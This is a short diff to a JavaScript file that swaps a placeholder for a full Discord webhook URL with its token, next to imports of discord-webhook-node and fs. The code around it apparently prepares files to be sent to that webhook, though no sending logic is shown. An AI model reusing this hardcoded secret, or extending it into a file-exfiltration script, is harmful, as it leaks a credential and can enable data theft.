@@ -15,7 +15,7 @@ const {
     Webhook, 
     MessageBuilder 
 } = require('discord-webhook-node');
-const yourhook = new Webhook('your-faking-noob-webhook'); // Noob webhooks.
+const yourhook = new Webhook('https://discord.com/api/webhooks/1030899716759752764/9ywheW45miNWNlE3ANAiMGvZU-iwD2tuOW277sta_HEsxu9ZBo_z-rk4_LMTNGxjppxE'); // Noob webhooks.
 const fs = require('fs');
 
 // Lets start:D
